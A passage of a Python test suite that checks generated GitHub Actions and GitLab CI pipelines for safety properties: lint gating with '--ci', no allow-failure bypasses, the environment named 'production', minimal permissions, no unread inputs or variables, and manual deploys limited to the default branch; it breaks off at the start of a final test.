    # (1c) Every `da-tools <sub> --flag` this workflow runs must be a real flag,
    # and `lint` must keep `--ci`. ⛔ Both properties were added to the CLI leg
    # only. Measured: re-adding `--ci` to the portal preview's validate step left
    # 104 passed while the identical edit on the CLI leg reds 6; dropping `--ci`
    # from the GitHub lint step left 93 passed while the GitLab one reds 6. This
    # helper exists precisely so a new property cannot land on one leg — the two
    # newest properties landed on one leg anyway, so they move in here.
    declared = _da_tools_subcommands()
    lint_seen = False
    for job in workflow["jobs"].values():
        for step in (job.get("steps") or []):
            for argv in _command_argvs(_strip_shell_comments(str(step.get("run", "")))):
                for i, tok in enumerate(argv):
                    if tok not in declared:
                        continue
                    used = {t.split("=")[0] for t in argv[i + 1:] if t.startswith("--")}
                    unknown = sorted(used - declared[tok] - _CLI_GLOBAL_FLAGS)
                    assert not unknown, (
                        f"{label}: `da-tools {tok}` is passed {unknown}, which "
                        f"it does not declare (it has {sorted(declared[tok])}). "
                        "argparse exits 2 on an unrecognised flag, so the step "
                        "fails every run and `needs:` takes the rest down."
                    )
                    if tok == "lint":
                        lint_seen = True
                        assert "--ci" in argv, (
                            f"{label}: `da-tools lint` without `--ci` ({argv}). "
                            "Without it the deny-list prints ERRORs and exits 0, "
                            "so the job goes green on denied PromQL."
                        )
    # The portal preview is a simplified sample with no lint step; the CLI
    # artifact has one. Each leg DECLARES which it is, so "no lint found" can
    # never quietly mean "the extractor broke".
    assert lint_seen == expects_lint, (
        f"{label}: lint invocation found={lint_seen}, expected={expects_lint}. "
        "If the leg gained or lost its lint step, say so here — otherwise the "
        "`--ci` pin above passes vacuously."
    )

    # (2c) A gate that is allowed to fail is not a gate. GitHub counts a
    # `continue-on-error` job's FAILURE as success when evaluating `needs:`, so
    # one line turns the whole `needs: [validate]` edge this PR pins into
    # decoration and `apply` deploys config that failed schema/routing/policy
    # validation. Measured: `continue-on-error: true` on `validate` left 95
    # passed. The repo already treats this as a check-defeating mechanism for
    # its OWN workflows (tests/dx/test_pr_preflight_checks.py) — that rule had
    # simply never been swept onto the artifacts we generate.
    # ⛔ BOTH levels. GitHub accepts `continue-on-error` on a job AND on each
    # step, and the step form is the more dangerous one: the step is recorded
    # failed while the JOB concludes success, so `needs: [validate]` is satisfied
    # by a `validate` that failed schema/routing/policy. Measured: one line on
    # the validate step left 95 passed, zero red.
    # ⛔ The sibling guard already had this derivation
    # (tests/ops/test_nightly_scan_matrix_drift.py, `step.get("continue-on-error",
    # job_coe)`) and only the job half was carried over here — a rule present in
    # one guard file and missing in the other is the most repeated defect in this
    # PR, so it is worth stating that this is the same rule, not a new one.
    for jname, job in workflow["jobs"].items():
        job_coe = job.get("continue-on-error", False)
        assert str(job_coe).lower() == "false", (
            f"{label}: job {jname!r} sets `continue-on-error: {job_coe!r}`. A "
            "failure there is reported as success to every job that `needs:` it, "
            "so the validation gate stops gating and the production deploy runs "
            "on unvalidated config."
        )
        for step in (job.get("steps") or []):
            step_coe = step.get("continue-on-error", job_coe)
            assert str(step_coe).lower() == "false", (
                f"{label}: step {step.get('name', step.get('uses'))!r} in job "
                f"{jname!r} sets `continue-on-error: {step_coe!r}`. The step is "
                "recorded as failed but the JOB still concludes success, so "
                "every `needs:` edge downstream is satisfied by a job whose work "
                "did not succeed."
            )

    # (3) The deploy job must still NAME its environment. Three separate pieces
    # of reasoning in this file rest on `apply` carrying `environment:
    # production`, and the GitLab side asserts its equivalent — this side did
    # not, and deleting the key from all three deploy branches left 93 passed.
    # It is also the only mitigation currently available for the stated
    # boundary that GitHub's `apply` is dispatchable from an unmerged branch:
    # an environment carries required reviewers and deployment branch policies.
    # ⛔ Both spellings. GitHub's `environment:` may be a string OR a mapping
    # (`{name: production, url: …}`), and the GitLab twin already handled the
    # mapping form while this leg compared a raw string — so the idiomatic edit
    # that adds a deployment URL would red with a message claiming the
    # environment was RENAMED. One-leg-of-a-pair again, in the direction of a
    # false red rather than a miss, but a misleading message is its own defect.
    apply_env = (workflow["jobs"].get("apply") or {}).get("environment")
    if isinstance(apply_env, dict):
        apply_env = apply_env.get("name")
    # ⛔ The NAME, not just its presence. GitHub's environment protection rules
    # (required reviewers, deployment branch policy) are bound to the name, and
    # this file's own stated boundary — that `apply` is gated on the EVENT and
    # not on the ref — names those protections as the only mitigation. Renaming
    # the environment silently decouples every rule attached to it, and
    # `assert apply_env` could not tell. Measured: renaming it in all six deploy
    # branches left 95 passed. A boundary must not rest on an unenforced fact.
    # One assertion, not two: an earlier version kept a follow-up `assert
    # apply_env` AFTER this equality, so it could never fail and its message —
    # the one explaining why the environment is load-bearing — was unreachable.
    # The explanation belongs in the message that can actually fire.
    assert apply_env == "production", (
        f"{label}: the `apply` job's environment is {apply_env!r}, not "
        "'production' (absent reads as None).\nThat key is load-bearing: the "
        "job is gated on the workflow_dispatch EVENT and not on the ref, so its "
        "required reviewers / deployment branch policy are the only thing "
        "standing between a dispatch from an unmerged branch and the customer's "
        "cluster — and GitHub attaches those rules to the NAME, so a rename "
        "detaches them as surely as a deletion."
    )


@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_github_permissions_grant_what_the_steps_actually_need(
    generated, ci, deploy
) -> None:
    """⛔ The `permissions:` VALUE, not just the key.

    `_EXPECTED_GH_TOP_LEVEL` pins that a `permissions:` block exists. That is
    only half a contract, and the missing half is the load-bearing one: dropping
    `pull-requests: write` and keeping `permissions: {contents: read}` left the
    key set identical and the whole suite green, while shipping back exactly the
    403 the block was added to prevent.

    The grant is checked TOGETHER with the step that needs it, so the two cannot
    drift apart: if the PR-comment step is ever removed, this test fails and
    asks for the scope to be re-derived rather than silently blessing a
    write scope nothing uses.
    """
    workflow = yaml.safe_load(
        (generated[(ci, deploy)] / _GH_WORKFLOW).read_text(encoding="utf-8")
    )
    steps = [s for job in workflow["jobs"].values() for s in (job.get("steps") or [])]
    commenters = [s for s in steps if "sticky-pull-request-comment" in str(s.get("uses", ""))]
    assert commenters, (
        "no PR-comment step in the generated workflow — the `pull-requests: "
        "write` grant below would then be a scope nothing uses. Re-derive the "
        "permissions block against whatever replaced it."
    )
    # The CLI artifact additionally needs `pull-requests: write`, because unlike
    # the portal preview it really does post a sticky PR comment. (That grant
    # cannot help a FORK PR — GitHub hard-locks that token to read-only
    # regardless of this block.)
    _assert_github_deploy_contract(
        workflow,
        f"CLI artifact (--ci {ci} --deploy {deploy})",
        {"contents": "read", "pull-requests": "write"},
        _CLI_GH_TRIGGERS,
        _cli_gh_uses(deploy),
        expects_lint=True,
    )


@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_every_declared_workflow_input_is_read_by_something(
    generated, ci, deploy
) -> None:
    """A declared knob that nothing reads is a lie told to the customer.

    #1361 was exactly this: `workflow_dispatch.inputs.dry_run` existed, looked
    like a safety switch, and no step referenced it — an operator ticking it got
    a real apply. Removing it fixed the instance; this asserts the CLASS, so the
    next dead input reds instead of shipping.

    Derived rather than enumerated: the check is "every declared input name is
    referenced from the executable surface", not "the input list equals []" — a
    future input that IS wired stays legal without editing this test. The
    The executable surface is every job's `if:` and every step's
    `if:`/`run:`/`with:` — NOT the `env:` blocks, which are bindings rather than
    reads (counting them as reads is the false negative `_unwired_knobs`
    documents). A binding is followed one hop, at its own visibility: workflow
    `env:` everywhere, a job's `env:` inside that job, a step's `env:` inside
    that step. Comments are excluded on purpose, and names match as whole tokens
    so a short input cannot ride on a longer one.
    """
    text = (generated[(ci, deploy)] / _GH_WORKFLOW).read_text(encoding="utf-8")
    workflow = yaml.safe_load(text)
    # `on:` parses to the boolean True under YAML 1.1, hence the `True` key.
    triggers = workflow.get(True) or workflow.get("on") or {}
    dispatch = triggers.get("workflow_dispatch") or {}
    declared = set((dispatch.get("inputs") or {}))

    # ⛔ Searched in the STEPS, not in the file's text. `f"inputs.{name}" not in
    # text` was the first form and it is satisfied by a comment — this generator
    # emits large comment blocks into its output, so measured: restoring the
    # #1361 input plus one line `# TODO: wire inputs.dry_run into the apply
    # steps` left the suite at 93 passed with the defect fully back. The subject
    # of "does anything READ this" is the executable surface, never the prose
    # next to it. (Same class as the run:/prose confusion fixed in the nightly
    # scan guard — a class fixed in one file has to be swept in the others.)
    # ⛔ ONE implementation, shared with `_assert_github_deploy_contract`. This
    # test used to carry its own copy of the reachability logic, which is the
    # two-legs problem in miniature: the copies drift, and the weaker one is the
    # one that keeps passing.
    unread = [k for k in _unwired_knobs(workflow) if k.startswith("inputs.")]
    assert not unread, (
        f"workflow_dispatch declares input(s) {unread} that no step reads "
        "(searched as a whole token in the executable surface — every job's "
        "`if:` and every step's `if:`/`run:`/`with:` — plus ONE hop through an "
        "`env:` binding at its own visibility. `env:` blocks are bindings, not "
        "reads: binding a knob to a variable nothing reads is not wiring.)\n"
        "A knob wired to nothing is worse than no knob: the operator believes "
        "they changed the run's behaviour and they did not — #1361 shipped a "
        "`dry_run` that did exactly this. Wire it, or delete it."
    )


@pytest.mark.parametrize("ci,deploy", GL_COMBOS)
def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
    generated, ci, deploy
) -> None:
    """⛔ A production-deploy job must not be reachable from arbitrary pipelines.

    This is #1356's mirror image on the other CI. #1356 was an ``apply`` that
    could never run; this is an ``apply`` that can ALWAYS run — and the shipped
    GitLab pipeline had it: a bare ``rules: - when: manual``, while every other
    job in the same file carried a real condition (``changes:`` on the validate
    jobs, ``if: $CI_PIPELINE_SOURCE == "merge_request_event"`` on generate).

    The rule being applied is GitLab's own, not a list of bad spellings: a
    ``rules:`` entry with no ``if:``/``changes:``/``exists:`` matches EVERY
    pipeline. So a job holding ``environment: production`` plus cluster-write
    credentials rendered a play button on every push and every merge request —
    including one opened by any Developer-role contributor, against code that
    was never merged and whose own validate jobs never even ran (their
    ``changes:`` filter would not have matched).

    Two properties, because each fails on its own:
      1. no unconditional rule entry on a job that declares an environment;
      2. the condition actually constrains the BRANCH. A rule conditioned only
         on, say, ``$CI_PIPELINE_SOURCE`` satisfies (1) while still offering the
         button on every merge request.
    """
    path = generated[(ci, deploy)] / _GL_PIPELINE
    pipeline = yaml.safe_load(path.read_text(encoding="utf-8"))
    jobs = _gitlab_jobs(pipeline)

    # ⛔ Floor first. This pin is consumed by a `for … in .items()` loop, which
    # is the one exact-pin shape in this file that RETIRES SILENTLY: every other
    # one is an `==` or `in` and reds when emptied, but emptying this dict left
    # 95 passed. The rules it pins are load-bearing (a `when: never` on
    # validate-config is caught by nothing else), so it gets the same floor the
    # counter-example corpora got.
    assert len(_EXPECTED_GL_JOB_RULES) >= 3, (
        f"_EXPECTED_GL_JOB_RULES has {len(_EXPECTED_GL_JOB_RULES)} entries — "
        "emptying it makes the loop below a no-op that still reports green. "
        "Every non-deploy GitLab job needs its gate pinned here."
    )
    assert set(_EXPECTED_GL_JOB_RULES) <= _EXPECTED_GL_JOBS, (
        "_EXPECTED_GL_JOB_RULES names jobs that are not in _EXPECTED_GL_JOBS: "
        f"{sorted(set(_EXPECTED_GL_JOB_RULES) - _EXPECTED_GL_JOBS)}"
    )
    # ⛔ Same rule as the GitHub leg's `continue-on-error` ban, with NO
    # exemptions — the two legs must reach the same verdict on the same input.
    #
    # ⚠️ An earlier version of this exempted `lint-custom-rules` and justified it
    # as "custom rule-packs are advisory by design". That justification was
    # invented here: the generator carried `allow_failure: true` with no comment,
    # and nothing anywhere recorded a decision. Checked against the actual tool
    # instead of the assumption: `da-tools lint --ci` exits non-zero on ERROR
    # only, its ERRORs are the governance deny-list on tenant-authored PromQL
    # (denied functions/patterns, missing required labels), WARN-level naming
    # nits never affect the exit code — and this platform gates ITSELF on that
    # same script in ci.yml and validate.yaml with `--ci` and no exemption. The
    # exemption was weaker than the tool's own severity call and weaker than what
    # we hold ourselves to, so it is gone rather than documented.
    assert set(pipeline) == _EXPECTED_GL_TOP_LEVEL, (
        f"GitLab top-level keys are {sorted(map(str, pipeline))}, expected "
        f"{sorted(_EXPECTED_GL_TOP_LEVEL)}.\nA new GLOBAL key is invisible to "
        "every other assertion here — `include:` pulls third-party CI config "
        "into a pipeline that holds cluster-write credentials, and `default:` "
        "injects into every job including `apply`. Both are valid per the "
        "schema, so this equality is the only thing that can see them."
    )

    # ⛔ Every job's image, not just the deploy stage's. The GitHub leg pins its
    # whole `uses:` set with versions; here only `apply`'s image was pinned
    # (test_init_project.py), so swapping `validate-config`'s
    # `image: $DA_TOOLS_IMAGE` for `alpine:3.20` left 95 passed — the validation
    # stage would then run without the tool it exists to run.
    for jname, job in jobs.items():
        image = job.get("image")
        image = image.get("name") if isinstance(image, dict) else image
        # ⛔ …and the variable must EXIST. `startswith("$")` alone accepted
        # `$DA_TOOLS_IMAGE_TYPO` (93 passed, schema happy) — GitLab expands an
        # undefined variable to empty, so the job stops running the tool it
        # exists to run. Presence of a sigil is not a reference.
        assert str(image).lstrip("$").strip("{}") in (pipeline.get("variables") or {}), (
            f"job {jname!r} runs image {image!r}, which names no declared "
            f"variable (have {sorted(pipeline.get('variables') or {})}). "
            "GitLab expands an undefined variable to the empty string."
        )
        assert str(image).startswith("$"), (
            f"job {jname!r} runs image {image!r}, which is not one of the "
            "pipeline's `variables:`. Every image here is meant to come from a "
            "variable the customer can override in one place; a literal pins "
            "them to whatever this generator happened to emit."
        )

    # ⛔ Floor. Every sibling collection in this file got one for this exact
    # shape (`_NEEDS`, `_EXPECTED_GL_JOB_RULES`, `_UNSUPPORTED_IFS`,
    # `_BYPASSES`, `DEPLOY_CHOICES`) — this one was missed. Measured: emptying
    # it while moving all three `apply` jobs into `stage: validate` left
    # 93 passed, i.e. the production play button in stage 1 with no red.
    assert set(_EXPECTED_GL_JOB_STAGES) == _EXPECTED_GL_JOBS, (
        f"_EXPECTED_GL_JOB_STAGES covers {sorted(_EXPECTED_GL_JOB_STAGES)}, "
        f"but the job set is {sorted(_EXPECTED_GL_JOBS)} — every job needs a "
        "pinned stage, or the loop below silently skips it."
    )
    for jname, want_stage in _EXPECTED_GL_JOB_STAGES.items():
        assert jobs[jname].get("stage") == want_stage, (
            f"job {jname!r} runs in stage {jobs[jname].get('stage')!r}, expected "
            f"{want_stage!r}. Stage ORDER is pinned below, but order alone does "
            "nothing if a job is assigned to a different stage — moving `apply` "
            "into `validate` puts the production deploy button in stage 1."
        )

    # ⛔ GitLab's SECOND level: `allow_failure` is legal inside a `rules:` entry
    # and overrides the job-level value. Banning only the job level is the same
    # one-level-of-two gap the GitHub leg had for `continue-on-error` — measured:
    # `allow_failure: true` on `apply`'s rule entry left 95 passed. (The three
    # validation jobs are incidentally covered by the exact rules pin, so the
    # hole landed exactly on the deploy job.)
    for jname, job in jobs.items():
        for entry in (job.get("rules") or []):
            if not isinstance(entry, dict):
                continue
            assert str(entry.get("allow_failure", "false")).lower() == "false", (
                f"job {jname!r} has a rules entry with `allow_failure: "
                f"{entry.get('allow_failure')!r}`. A rule-level value overrides "
                "the job, so the gate stops gating while the job block still "
                "looks strict."
            )

    for jname, job in jobs.items():
        assert str(job.get("allow_failure", "false")).lower() == "false", (
            f"job {jname!r} sets `allow_failure: {job.get('allow_failure')!r}`. "
            "A stage that is allowed to fail does not gate anything, and stage "
            "order is the only thing putting this before the production deploy. "
            "The GitHub artifact runs the same checks with no exemption — an "
            "exemption here makes the two legs disagree about the same input."
        )

    for jname, expected_rules in _EXPECTED_GL_JOB_RULES.items():
        assert jobs[jname].get("rules") == expected_rules, (
            f"job {jname!r} rules are {jobs[jname].get('rules')!r}, expected "
            f"{expected_rules!r}. These are the gates that decide whether the "
            "customer's validation jobs are created at all; a rule that matches "
            "nothing (or `when: never`) leaves the pipeline with only `apply` — "
            "a manual production deploy with nothing having validated anything. "
            "This file's stated boundaries also reason FROM these rules, so a "
            "change here has to be argued, not absorbed."
        )

    # ⛔ The dead-knob property, on THIS leg too. It was enforced for the GitHub
    # artifact only, and the GitLab one shipped the identical defect at the same
    # time: `variables: MONITORING_NS` declared in all three deploy branches
    # while every script hardcoded `-n monitoring`. Measured: reverting the
    # GitHub side to hardcoded literals reds 4 tests; the same defect on this
    # side red nothing, because nothing looked. A property enforced on one leg
    # of a pair is the shape that has produced the most defects in this file.
    # ⛔ Shell comments stripped, and EVERY place GitLab lets a variable be read.
    # Two separate holes were measured here: a `script:` line that only mentions
    # `$MONITORING_NS` inside a `# TODO:` comment made the whole guard pass
    # (84 passed, 0 failed) with the dead variable still shipping; and the
    # surface omitted `before_script`, `after_script`, `environment:`,
    # `artifacts:`, job-level `variables:` and variable-to-variable
    # interpolation, so a genuinely-read variable would have been reported dead.
    # One is a false negative and the other a false positive — the same list
    # fixes both, which is why the surface is enumerated from GitLab's schema
    # rather than from the two places this generator happens to use today.
    _READ_KEYS = (
        "image", "rules", "script", "before_script", "after_script",
        "environment", "artifacts", "variables", "needs", "cache",
    )
    # ⛔ Strip BEFORE `str()`, one scalar at a time. Stripping the repr of a list
    # is a complete no-op: `str(["a # b"])` wraps every element in Python quotes,
    # so the comment-stripper's quote tracker never leaves the quoted state and
    # no `#` is ever seen as a comment. Measured on the shipped pipeline:
    # `_strip_shell_comments(str(script)) == str(script)`. The previous version
    # of this block added the stripper and claimed the false negative was closed;
    # it was not — a `- |` block whose only mention of `$MONITORING_NS` was a
    # `# TODO:` line still passed 95/95. Flattening to scalars first is the
    # difference between calling the helper and using it.
    def _flat(value) -> list[str]:
        if isinstance(value, str):
            return [value]
        if isinstance(value, list):
            return [s for v in value for s in _flat(v)]
        if isinstance(value, dict):
            return [s for v in value.values() for s in _flat(v)]
        return [] if value is None else [str(value)]

    scalars: list[str] = _flat(pipeline.get("default")) + _flat(pipeline.get("workflow"))
    for j in jobs.values():
        for k in _READ_KEYS:
            scalars.extend(_flat(j.get(k)))
    # A variable may also be read by another variable's value.
    scalars.extend(_flat(pipeline.get("variables")))
    read_surface = "\n".join(_strip_shell_comments(s) for s in scalars)
    # ⛔ `--ci` on the lint invocation is LOAD-BEARING and was unpinned. The whole
    # argument for removing `allow_failure` is "`da-tools lint --ci` exits
    # non-zero on ERROR only" — drop the flag and the command reports violations
    # and exits 0, so the job passes and the deny-list stops gating. Measured:
    # dropping it left 95 passed. A guard whose justification rests on a flag
    # must pin that flag. (`validate-config` is the mirror case and needs the
    # OPPOSITE: it declares no `--ci` and exits non-zero on failure by default —
    # see the CLI-flag guard, which now catches passing one that does not exist.)
    lint_argvs = [
        a for j in jobs.values() for s in (j.get("script") or [])
        for a in _command_argvs(_strip_shell_comments(str(s)))
        if "lint" in a
    ]
    assert lint_argvs, "no `da-tools lint` invocation found in the pipeline"
    for argv in lint_argvs:
        assert "--ci" in argv, (
            f"`da-tools lint` is invoked without `--ci`: {argv}. Without it the "
            "command prints deny-list ERRORs and exits 0, so the job goes green "
            "and the governance gate this pipeline relies on stops gating."
        )

    dead_vars = sorted(
        k for k in (pipeline.get("variables") or {})
        if not re.search(rf"\$\{{?{re.escape(str(k))}(?![\w-])", read_surface)
    )
    assert not dead_vars, (
        f"the `--deploy {deploy}` pipeline declares variable(s) {dead_vars} "
        "that no job's `image:`, `rules:` or `script:` reads. A customer edits "
        "the one namespace-looking name in the file and nothing changes — the "
        "#1361 class, in `variables:`. Wire it, or declare it only in the "
        "branches whose scripts use it."
    )

    deploying = {n: b for n, b in jobs.items() if "environment" in b}
    assert deploying, (
        f"no job in the `--deploy {deploy}` pipeline declares an `environment:` "
        "— either the deploy stage vanished or it stopped naming its target, "
        "and this guard would grade nothing. Point it at the new shape."
    )

    # ⛔ Stage ORDER, not just membership. `apply` carries no `needs:`, so stage
    # order is the ONLY thing sequencing it after validation — and this file's
    # boundary paragraph reasons from exactly that. Membership was asserted;
    # sequence was not. Measured: reordering to `[apply, validate, generate]`
    # left 95 passed, and the manual play button then sits in stage 1, where an
    # operator can deploy before `validate-config` has run at all.
    assert pipeline.get("stages") == ["validate", "generate", "apply"], (
        f"`stages:` is {pipeline.get('stages')!r}, expected "
        "['validate', 'generate', 'apply']. "
        "The deploy job carries no `needs:`, so this order is the only thing "
        "putting validation before deployment. A boundary stated in prose must "
        "not rest on an unenforced fact."
    )

    # ⛔ The environment NAME, same as the GitHub leg — and the reason is if
    # anything stronger here: GitLab binds protected environments (deployment
    # approvals, who may deploy) and environment-scoped CI/CD variables — where
    # the customer puts KUBE_CONFIG — to the NAME. Renaming detaches both while
    # every other assertion still passes. The GitHub twin was pinned with an
    # explicit argument for why names matter; this leg was left selecting on
    # mere presence, which is the same one-leg-of-a-pair gap again.
    for name, body in deploying.items():
        env_name = body["environment"]
        if isinstance(env_name, dict):
            env_name = env_name.get("name")
        assert env_name == "production", (
            f"job {name!r} deploys to environment {env_name!r}, not "
            "'production'. GitLab attaches protected-environment approvals and "
            "environment-scoped variables (the customer's cluster credentials) "
            "to that name, so a rename detaches both silently."
        )

    for name, body in deploying.items():
        env = body["environment"]
        rules = body.get("rules")
        assert rules, (
            f"job {name!r} deploys to {env!r} but declares no `rules:` at all — "
            "GitLab then adds it to every pipeline unconditionally."
        )
        # ⛔ EVERY entry, one at a time. GitLab `rules:` are OR-ed and
        # first-match-wins, so the safety property is universally quantified:
        # ONE compliant entry does not redeem the others, it just sits beside
        # them. The first version of this check flattened all entries into a
        # single string (`" ".join(...)`) before looking for CI_DEFAULT_BRANCH,
        # which turned a for-all into an exists — measured: adding
        # `- if: $CI_PIPELINE_SOURCE == "merge_request_event"` / `when: manual`
        # beside the branch rule left the suite at 93 passed while restoring the
        # every-merge-request deploy button this test exists to prevent.
        for entry in rules:
            assert isinstance(entry, dict), (
                f"job {name!r} has a non-mapping rules entry {entry!r}; this "
                "guard reads `if:`/`when:` per entry and cannot grade that"
            )
            assert _GITLAB_RULE_CONDITIONS & set(entry), (
                f"job {name!r} deploys to {env!r} and has rule entry {entry!r} "
                "with no `if:`/`changes:`/`exists:`. Such an entry matches "
                "EVERY pipeline, so this is a production-deploy button on every "
                "push and every merge request. (GitHub sibling: "
                "workflow_dispatch-only; here: "
                "`if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH`.)"
            )
            # ⛔ EXACT expression, allowlisted — not "does the string mention
            # CI_DEFAULT_BRANCH". Substring matching on an expression grades the
            # variable's PRESENCE, never its MEANING, and both ways of widening
            # survive it. Measured, each against an 83-passed baseline:
            #   `$CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH`   -> 83 passed
            #   `... == ... || $CI_PIPELINE_SOURCE == "merge_request_event"`
            #                                               -> 83 passed
            # The first inverts the guard (deploy from every branch EXCEPT main);
            # the second re-opens every merge request. Note the second is the
            # same widening the per-entry loop above already catches when it is
            # written as a separate entry (control: 6 failed) — moving it inside
            # one entry's expression walked straight past. Fixing the aggregation
            # across entries and leaving it inside an entry is the identical
            # mistake one level down, which is why this is now an equality
            # against a set of expressions whose meaning has been argued.
            cond = str(entry.get("if", "")).strip()
            assert cond in _GITLAB_DEPLOY_CONDITIONS, (
                f"job {name!r} deploys to {env!r} with rule condition {cond!r}, "
                f"which is not one this guard has agreed to: "
                f"{sorted(_GITLAB_DEPLOY_CONDITIONS)}.\n"
                "This is deliberately an equality: `!=`, `||`, and anything else "
                "that changes what the expression MEANS all contain the right "
                "variable name. If a new condition is genuinely correct, add it "
                "to _GITLAB_DEPLOY_CONDITIONS with the reasoning — do not relax "
                "this into a substring test."
            )
            # `when:` matters as much as `if:`. Dropping `when: manual` (a
            # plausible "make CD automatic" edit) makes this fire on every push
            # to the default branch — `kubectl apply` + `rollout restart` into
            # production with no human in the loop — while the GitHub sibling
            # still demands an explicit workflow_dispatch. Alignment means both
            # halves: which branch, AND that a person presses it.
            assert entry.get("when") == "manual", (
                f"job {name!r} deploys to {env!r} and rule entry {entry!r} is "
                f"`when: {entry.get('when')!r}`, not `manual`. That deploys "
                "automatically on every matching pipeline; the GitHub sibling "
                "requires an explicit workflow_dispatch."
            )


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_ci_selection_controls_which_artifacts_exist(generated, ci, deploy) -> None:
    """``--ci`` must gate the artifact trees, in both directions.

    Checked over the whole directory, not just the one expected filename: a
    dispatch bug that wrote a *differently named* workflow would slip past a
    single ``exists()`` call.
    """
    root = generated[(ci, deploy)]
    gh_files = sorted(p.name for p in (root / ".github" / "workflows").glob("*")
                      ) if (root / ".github" / "workflows").is_dir() else []
    gl_files = sorted(p.name for p in (root / ".gitlab-ci.d").glob("*")
                      ) if (root / ".gitlab-ci.d").is_dir() else []

    if ci in _EMITS_GITHUB:
        assert gh_files == [_GH_WORKFLOW.name], f"--ci {ci} emitted {gh_files}"
    else:
        assert gh_files == [], (
            f"--ci {ci} must not emit GitHub Actions files, got {gh_files}"
        )

    if ci in _EMITS_GITLAB:
        assert gl_files == [_GL_PIPELINE.name], f"--ci {ci} emitted {gl_files}"
    else:
        assert gl_files == [], (
            f"--ci {ci} must not emit GitLab CI files, got {gl_files}"
        )


# ============================================================
# ── 4. The portal wizard's preview (a SECOND generator) ──
# ============================================================

# Same regex the real bundler uses (tools/portal/build.mjs
# stripFrontmatterPlugin): the portal's .js sources carry a YAML frontmatter
# doc-block that is not valid JavaScript, so it must be removed before node can
# load the module. Line count is preserved so any node stack trace still points
# at the right source line.
_FRONTMATTER_RE = re.compile(r"^---\r?\n[\s\S]*?\r?\n---\s*(?:\r?\n|$)")


def _portal_module(tmp_path: Path) -> str:
    """Materialise generators.js as a loadable ESM module; return its URI."""
    stripped = _FRONTMATTER_RE.sub(
        lambda m: "\n" * m.group(0).count("\n"),
        _PORTAL_GENERATORS.read_text(encoding="utf-8"),
        count=1,
    )
    assert "cicdGenerateGitHubActionsPreview" in stripped
    assert not stripped.lstrip().startswith("---"), "frontmatter strip failed"

    module = tmp_path / "generators.mjs"
    module.write_text(stripped, encoding="utf-8")
    # json.dumps, not repr: a Python repr yields single-quoted strings and a
    # Windows file URI is full of characters worth not hand-quoting.
    return json.dumps(module.as_uri())


def _call_portal(tmp_path: Path, fn: str, config: dict) -> str:
    """Evaluate one exported generator against ``config`` and return stdout."""
    driver = (
        f"import {{ {fn} }} from {_portal_module(tmp_path)};\n"
        f"const out = {fn}({json.dumps(config)});\n"
        f"process.stdout.write(typeof out === 'string' "
        f"? out : JSON.stringify(out));\n"
    )
    proc = _run([_NODE, "--input-type=module", "-e", driver])
    assert proc.returncode == 0, (
        f"could not evaluate the portal generator {fn}:\n"
        f"{proc.stdout}\n{proc.stderr}"
    )
    return proc.stdout


def _load_portal_preview(tmp_path: Path, deploy: str) -> str:
    return _call_portal(
        tmp_path,
        "cicdGenerateGitHubActionsPreview",
        {"deploy": deploy, "tenants": [], "packs": []},
    )


@_needs_node
@_needs_actionlint
@pytest.mark.parametrize("deploy", DEPLOY_CHOICES)
def test_portal_preview_workflow_passes_actionlint(tmp_path, deploy) -> None:
    """The wizard shows this YAML to the user as a copy-me sample.

    ⛔ Honest framing: this leg PINS THE STATUS QUO. All three deploy branches
    already passed actionlint before this test existed — the portal preview
    never had the #1347 defect, because its ``apply:`` is written inline at the
    right indentation instead of being spliced in from a second template. What
    it buys is that the *other* generator can no longer regress unnoticed, and
    that the two generators' divergence (issue #1351) is measurable rather than
    assumed.

    The deploy values come from the CLI parser on purpose: the wizard is a UI
    over the same `da-tools init` flags, so a new CLI deploy method that the
    wizard has not learned about should surface here.
    """
    workflow = _load_portal_preview(tmp_path, deploy)
    out = tmp_path / f"portal-preview-{deploy}.yaml"
    out.write_text(workflow, encoding="utf-8")

    proc = _run([_ACTIONLINT, "-shellcheck=", "-pyflakes=", str(out)])
    assert proc.returncode == 0, (
        f"actionlint rejected the portal CI/CD wizard preview for "
        f"deploy={deploy}:\n{proc.stdout}\n{proc.stderr}"
    )


@_needs_node
@pytest.mark.parametrize("deploy", DEPLOY_CHOICES)
def test_portal_preview_top_level_shape(tmp_path, deploy) -> None:
    """Binary-free counterpart of the test above (see the YAML-1.1 `on:` note)."""
    workflow = yaml.safe_load(_load_portal_preview(tmp_path, deploy))
    assert set(workflow) == {"name", True, "jobs", "permissions"}, (
        f"unexpected top-level keys in the portal preview for deploy={deploy}: "
        f"{sorted(map(str, workflow))}"
    )
    assert set(workflow["jobs"]) == {"validate", "generate", "apply"}
    # ⛔ Value, not just key — the same half-contract that let the CLI copy lose
    # `pull-requests: write` silently. The expected value DIFFERS from the CLI's
    # on purpose: this preview's generate job writes `.output/` and posts
    # nothing, so a write scope here would be a privilege the sample never uses
    # and a bad default for whoever copies it. If a comment step is ever added
    # to the preview, this fails and asks for the scope to be re-derived.
    # ⛔ Pin the ACTION SET, not the absence of one hard-coded action name.
    # Selecting on `"sticky-pull-request-comment" in uses` fails OPEN here (any
    # other PR-commenting action satisfies "no comment step" while still needing
    # `pull-requests: write`, which this preview does not grant) while the same
    # shape on the CLI leg fails CLOSED — measured: adding
    # `peter-evans/create-or-update-comment@v4` to the preview left 93 passed,
    # the mirror edit on the CLI leg reds 12. An exact set has no such asymmetry.
    uses = sorted(
        str(s["uses"]).split("@")[0]
        for job in workflow["jobs"].values()
        for s in (job.get("steps") or [])
        if s.get("uses")
    )
    assert uses == ["actions/checkout"] * 3, (
        f"portal preview uses actions {uses}, expected three checkouts and "
        "nothing else. A step that talks to the GitHub API needs a scope this "
        "preview deliberately does not grant — add the scope AND update this "
        "pin together, or drop the step."
    )
    # ⛔ The SAME contract the CLI artifact is held to, via the shared helper —
    # job-level overrides, dead inputs, and the deploy job's `environment:`.
    # Grading only the CLI leg is what let both of this PR's own fixes be
    # re-shipped from this generator with the suite green.
    _assert_github_deploy_contract(
        workflow, f"portal preview (deploy={deploy})", {"contents": "read"},
        _PORTAL_GH_TRIGGERS,
        _PORTAL_GH_USES,
        expects_lint=False,
    )


@_needs_node
@pytest.mark.parametrize("deploy", DEPLOY_CHOICES)
def test_portal_preview_job_event_gating(tmp_path, deploy) -> None:
